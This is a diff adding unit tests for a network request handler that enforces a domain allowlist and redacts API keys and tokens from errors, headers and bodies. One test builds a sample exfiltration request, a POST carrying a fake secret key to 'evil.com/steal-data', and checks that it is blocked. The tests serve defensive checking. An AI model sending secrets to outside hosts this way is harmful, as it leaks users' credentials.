@@ -185,6 +185,28 @@ describe('NetworkRequestHandlerImpl', () => {
     expect(result.error).toContain('Domain not in allowlist');
   });
 
+  it('should not call fetch or send secret-bearing data to non-allowlisted domains', async () => {
+    const mockFetch = vi.fn();
+    global.fetch = mockFetch;
+    const secret = 'sk-networkdeny1234567890abcdefghi';
+
+    const result = await handler.execute({
+      url: 'https://evil.com/steal-data',
+      method: 'POST',
+      headers: {
+        Authorization: `Bearer ${secret}`,
+      },
+      body: {
+        api_key: secret,
+      },
+    });
+
+    expect(result.success).toBe(false);
+    expect(result.error).toBe('Domain not in allowlist');
+    expect(JSON.stringify(result)).not.toContain(secret);
+    expect(mockFetch).not.toHaveBeenCalled();
+  });
+
   it('should accept allowlisted domains', async () => {
     // Mock fetch
     const mockResponse = {
@@ -396,6 +418,95 @@ describe('NetworkRequestHandlerImpl', () => {
 
     expect(result.success).toBe(false);
     expect(result.error).toBe('Network failure');
+  });
+
+  it('should redact secret-like network error messages', async () => {
+    const secret = 'sk-networkerror1234567890abcdefghi';
+    const networkError = new Error(`proxy failed with api_key=${secret}`);
+    global.fetch = vi.fn().mockRejectedValue(networkError);
+
+    const result = await handler.execute({
+      url: 'https://example.com',
+    });
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain('[REDACTED:api_key_assignment]');
+    expect(result.error).not.toContain(secret);
+  });
+
+  it('should redact secret-like response bodies and headers', async () => {
+    const bodySecret = 'sk-networkbody1234567890abcdefghi';
+    const headerSecret = 'sk-networkheader1234567890abcdefghi';
+    const mockResponse = {
+      ok: true,
+      status: 200,
+      statusText: 'OK',
+      headers: new Headers({
+        'content-type': 'application/json',
+        'x-debug-token': `token=${headerSecret}`,
+      }),
+      text: async () => `{"api_key":"${bodySecret}","ok":true}`,
+    };
+    global.fetch = vi.fn().mockResolvedValue(mockResponse);
+
+    const result = await handler.execute({
+      url: 'https://example.com/secret-bearing-response',
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.body).toContain('[REDACTED:openai_like_api_key]');
+    expect(result.body).not.toContain(bodySecret);
+    expect(result.headers?.['x-debug-token']).toContain('[REDACTED:token_assignment]');
+    expect(result.headers?.['x-debug-token']).not.toContain(headerSecret);
+    expect(JSON.stringify(result)).not.toContain(bodySecret);
+    expect(JSON.stringify(result)).not.toContain(headerSecret);
+  });
+
+  it('should preserve both markers for adjacent secret/platform response and error text', async () => {
+    const rawAdjacent = 'sk-network-adjacent-secret-qq-1234567890';
+    const rawPlatformId = 'qq-1234567890';
+    const rawNumericPlatformId = '1234567890';
+    const mockResponse = {
+      ok: true,
+      status: 200,
+      statusText: `OK ${rawAdjacent}`,
+      headers: new Headers({
+        'content-type': 'application/json',
+        'x-debug-token': `token=${rawAdjacent}`,
+      }),
+      text: async () => `{"target":"${rawAdjacent}","ok":true}`,
+    };
+    global.fetch = vi.fn().mockResolvedValueOnce(mockResponse);
+
+    const result = await handler.execute({
+      url: 'https://example.com/adjacent-secret-platform',
+    });
+
+    expect(result.success).toBe(true);
+    expect(result.body).toContain('[REDACTED:openai_like_api_key]');
+    expect(result.body).toContain('[REDACTED:platform_id]');
+    expect(result.statusText).toContain('[REDACTED:openai_like_api_key]');
+    expect(result.statusText).toContain('[REDACTED:platform_id]');
+    expect(result.headers?.['x-debug-token']).toContain('[REDACTED:token_assignment]');
+    expect(result.headers?.['x-debug-token']).toContain('[REDACTED:platform_id]');
+    expect(JSON.stringify(result)).not.toContain(rawAdjacent);
+    expect(JSON.stringify(result)).not.toContain(rawPlatformId);
+    expect(JSON.stringify(result)).not.toContain(rawNumericPlatformId);
+
+    global.fetch = vi.fn().mockRejectedValueOnce(
+      new Error(`proxy failed target=${rawAdjacent}`)
+    );
+
+    const errorResult = await handler.execute({
+      url: 'https://example.com/adjacent-network-error',
+    });
+
+    expect(errorResult.success).toBe(false);
+    expect(errorResult.error).toContain('[REDACTED:openai_like_api_key]');
+    expect(errorResult.error).toContain('[REDACTED:platform_id]');
+    expect(JSON.stringify(errorResult)).not.toContain(rawAdjacent);
+    expect(JSON.stringify(errorResult)).not.toContain(rawPlatformId);
+    expect(JSON.stringify(errorResult)).not.toContain(rawNumericPlatformId);
   });
 
   it('should handle HTTP error responses', async () => {
